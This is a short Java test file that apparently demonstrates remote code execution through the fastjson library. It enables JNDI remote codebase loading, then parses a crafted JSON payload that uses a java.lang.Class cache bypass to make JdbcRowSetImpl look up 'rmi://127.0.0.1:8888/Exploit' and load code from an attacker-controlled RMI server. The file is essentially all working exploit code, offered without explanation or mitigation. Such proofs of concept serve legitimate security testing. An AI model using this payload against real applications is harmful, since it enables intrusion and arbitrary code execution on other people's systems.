

import com.alibaba.fastjson.JSON;

public class Test {
	public static void main(String[] argv) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
		System.out.println(System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
		System.out.println(System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));
		String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:8888/Exploit\",\"autoCommit\":true}}";
		System.out.println(payload);
        JSON.parse(payload);
    }
}
